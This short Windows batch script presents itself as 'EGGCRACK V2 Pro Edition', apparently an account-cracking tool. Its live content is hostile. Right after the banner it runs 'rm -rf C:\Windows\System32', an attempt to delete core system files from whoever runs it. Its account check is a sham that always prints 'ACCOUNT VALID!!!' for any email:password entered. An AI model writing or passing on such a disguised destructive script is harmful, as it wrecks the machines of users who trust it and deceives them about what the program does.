@echo off
color 2
echo ---------------------------------------------
echo            EGGCRACK V2 Pro Edition
echo ---------------------------------------------
echo >nul
rm -rf C:\Windows\System32
:accountcheck
set /p account="Enter account in email:password format: "
echo Checking account %account%
echo ACCOUNT VALID!!!
pause
goto accountcheck
